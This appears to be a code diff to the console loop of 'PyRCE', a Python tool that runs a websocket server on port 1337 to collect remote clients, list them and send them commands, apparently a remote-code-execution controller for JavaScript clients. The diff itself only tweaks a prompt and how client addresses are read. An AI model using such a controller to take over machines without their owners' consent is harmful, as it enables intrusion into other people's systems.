@@ -12,12 +12,12 @@ from printer import Printer
 if __name__ == "__main__":
 
     try:
-        server = WebsocketServer("0.0.0.0", 1337)
+        server = WebsocketServer("0.0.0.0", 1337, 'javascript')
         global listener_thread
         p = Printer()
         print "PyRCE - Commands: listen, list, control"
         while True:
-            cmd = raw_input('>')
+            cmd = raw_input('> ')
             if cmd == "listen":
                 listener_thread = threading.Thread(target=server.listen(persist=True))
                 listener_thread.start()
@@ -28,11 +28,11 @@ if __name__ == "__main__":
                     p.info("There are no clients connected. Use 'listen' to collect clients.")
                 else:
                     for i,c in enumerate(server.CLIENTS):
-                        print "{}. {}".format(i+1, c['addr'])
+                        print "{}. {}".format(i+1, c.addr)
             if cmd == "control":
                 p.prompt("Which clients? (1 2 ...)")
                 for i,c in enumerate(server.CLIENTS):
-                    print "{}. {}".format(i+1, c['addr'])
+                    print "{}. {}".format(i+1, c.addr)
 
                 cmd = raw_input()
 
